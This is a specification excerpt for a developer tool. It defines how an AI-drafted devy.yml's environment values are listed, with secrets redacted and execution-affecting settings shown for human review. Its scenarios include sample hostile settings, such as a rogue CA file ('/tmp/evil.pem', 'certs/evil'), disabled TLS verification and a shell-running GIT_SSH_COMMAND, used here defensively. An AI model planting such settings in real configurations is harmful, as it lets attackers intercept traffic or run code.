Values SHALL be printed in full, with control characters stripped and whitespace runs collapsed. In `environment` values, the credential-looking parts the ai-assist value redaction recognizes (URL userinfo passwords, well-known token prefixes, secret-named assignments) SHALL always be replaced by `<redacted>`, so the listing never prints a secret to a terminal or CI log. A secret-named assignment inside a value SHALL hide only its own value, up to the next whitespace or quote, never the rest of the value (so `GIT_SSH_COMMAND="TOKEN=1 sh -c '…'"` keeps the command visible), and a value whose parts were hidden SHALL be followed by `(partly hidden; review it in devy.yml)`. (An unquoted spaced value of such an assignment, as in `password=correct horse`, therefore shows the words after the first; that note says the value needs review.) For a key that names a secret under the ai-assist key rule, the whole value SHALL be replaced by `<redacted>`, except as follows (keys are matched on whole words, split at `_`, `-`, `.` and camelCase):
- a switch value (`0`, `1`, `true`, `false`, `yes`, `no`, `on`, `off`) is shown for any key (`NODE_TLS_REJECT_UNAUTHORIZED=0`), and a mode word (`never`, `prefer`, `force`, `always`, `auto`) for any key that does not name a credential outright (`SSH_ASKPASS_REQUIRE=force`);
- `GIT_CONFIG_KEY_<n>` names a git config key, not a secret, and is shown;
- a key that names a credential outright (a word `PASSWORD`, `PASSWD`, `PWD`, `TOKEN`, `SECRET`, `PRIVATE`, `KEY`, `APIKEY`, `AUTH`, `COOKIE`, `SESSION`, `DSN`, `SIG`, `SIGNATURE`, `SALT`, `PAT`, `PIN`, `CREDS` or `PW`, or a plural; a word `CREDENTIAL`, `KEYSTORE`, `KEYRING` or `KEYCHAIN`; `PASS`, `TOKEN` or `SECRET` inside a word; or a word ending in `KEY` or `AUTH`; not `*ASKPASS`, the `AUTH` of `*_AUTH_SOCK` or the `SESSION` of `DBUS_*`) shows only a reference to a program: a path when its last word is `FILE`, `DIR` or `PATH` (`ANSIBLE_VAULT_PASSWORD_FILE=./x` or `scripts/vault.sh`), or, when its last word is `OPTIONS` or `OPTS`, a value whose first word starts with `-` or like a path (`PASSWORD_STORE_GPG_OPTS=--no-throw-keyids`), or, when its last word is a command word (`COMMAND`, `HELPER`, `CMD`, `PROVIDER`, `PROVIDERS`, or ending in `COMMAND` as in `BORG_PASSCOMMAND`; so `CARGO_REGISTRY_CREDENTIAL_PROVIDER`, `CARGO_REGISTRIES_<name>_CREDENTIAL_PROVIDER` and `CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS` are command keys), a bare program name (letters, `-`, `_` and `.` only, as in `GIT_CREDENTIAL_HELPER=osxkeychain`) or a command whose first word starts like a path or is a common secret-printing program (`sh`, `bash`, `op`, `pass`, `gpg`, `security`, `vault`, `aws`, `curl`, …), any of whose words starts like a path, or that contains whitespace and a shell operator (`|`, `;`, `&&`, `$(`, a backtick, `<`, `>`), so a passphrase such as `correct horse` stays hidden (a command matching none of these, such as `npx pkg`, is shown as `<redacted> (a command; review it in devy.yml)`);
- a key whose last word ends in `ASKPASS` names the program that asks for a password, never the password, and its value is always shown;
- a program key (last word a command word, `OPTIONS`, `OPTS` or `PATH`; first word `LD` or `DYLD`) shows: for a command word, a command as above or a bare program name (letters, `-`, `_` and `.` only); for `OPTIONS` or `OPTS`, a value whose first word starts with `-` or like a path; otherwise a path or a value that contains whitespace;
- a file or socket key (a word `CERT`, `CERTS`, `CA` or `CREDENTIALS`, last word `SOCK`, first word `DBUS`, or `XAUTHORITY`) shows a value without whitespace that starts like a path, or is a relative path of plain segments ending in a certificate, key, credentials or config extension (`pem`, `crt`, `cer`, `der`, `key`, `p12`, `pfx`, `json`, `jks`, `ini`, `toml`, `yaml`, `yml`, `sock`, `conf`), a relative path of plain segments with a `/` or `\` (`certs/evil`; for a `*CREDENTIALS` key only when its last word is `FILE`, `DIR` or `PATH`, since `user/password` is a credential), or, for a `DBUS_*` or `*SOCK` key, a `unix:path=`/`unix:abstract=` address.

A path, here, is a value without whitespace that starts like a path (`/`, `./`, `../`, `~/`, `\` or a drive letter), is a relative path of plain segments (letters, digits, `.`, `-`, `_`) separated by `/` or `\` (`scripts/askpass.sh`), or is a bare file name with an extension (`vault.sh`); a bare word without an extension (`hunter8`) is not, since it is as likely a password. Whenever a whole value is replaced by `<redacted>`, it SHALL be followed by `(may name a program or file; review it in devy.yml)` (or, under a command word, `(a command; review it in devy.yml)`), unless the key's last word names the secret itself (`PASSWORD`, `PASSWD`, `PASS`, `PASSPHRASE`, `PWD`, `TOKEN`, `SECRET`, `KEY`, `APIKEY`, `PIN`, `AUTH`, `SALT`, `SIG`, `SIGNATURE` or `CREDENTIAL`, or a plural) and the key is not also a program or file key. So `API_TOKEN=<redacted>` has no note, while a hidden `PASSWORD_STORE_GPG_OPTS`, `MY_PASSWORD_MODE` or `SONATYPE_CREDENTIALS` (a file key) value has one.

A value's shape alone never reveals a value under a credential name: passwords can contain spaces, `&`, `:` or `/`. So `GIT_ASKPASS=./scripts/x.sh`, `GIT_ASKPASS=scripts/askpass.sh`, `NODE_EXTRA_CA_CERTS=certs/evil` and `SSL_CERT_FILE=/tmp/ca.pem` are shown, while `API_TOKEN=ghp_…`, `DB_PASSWORD="correct horse battery staple"` and `AWS_SECRET_ACCESS_KEY=wJal…/K7MD…` are not. The config diff SHALL compare the unredacted values. Groups with no entries SHALL be omitted.

#### Scenario: Secret environment value masked
- **WHEN** a drafted `devy.yml` sets `environment.API_TOKEN: hunter2` and AI `init` lists its executable entries
- **THEN** the listing shows `API_TOKEN=<redacted>` and not `hunter2`

#### Scenario: Execution-affecting values are shown
- **WHEN** `devy.yml` sets `environment.GIT_ASKPASS: ./scripts/x.sh` and `environment.SSL_CERT_FILE: /tmp/evil.pem`
- **THEN** the listing shows `GIT_ASKPASS=./scripts/x.sh` and `SSL_CERT_FILE=/tmp/evil.pem` in full

#### Scenario: Relative program paths are shown
- **WHEN** `devy.yml` sets `environment.GIT_ASKPASS: scripts/askpass.sh`, `environment.ANSIBLE_VAULT_PASSWORD_FILE: scripts/vault.sh` and `environment.CREDENTIALS_PATH: hunter8`
- **THEN** the listing shows the first two in full and `CREDENTIALS_PATH=<redacted> (may name a program or file; review it in devy.yml)`

#### Scenario: Listing shows hooks and setup
- **WHEN** `devy.yml` declares `node` with a `package.json` present and `hooks.after_up: "make seed"`
- **THEN** the listing shows `make seed` under `Hooks` and `npm install (package.json lifecycle scripts)` under `Project setup`

#### Scenario: Listing shows system packages
- **WHEN** `devy.yml` sets `package_manager: apt` and declares `jq` and `node` with version `20`
- **THEN** the listing shows `jq (sudo apt-get)` and `node@20 (sudo apt-get)` under `System packages`
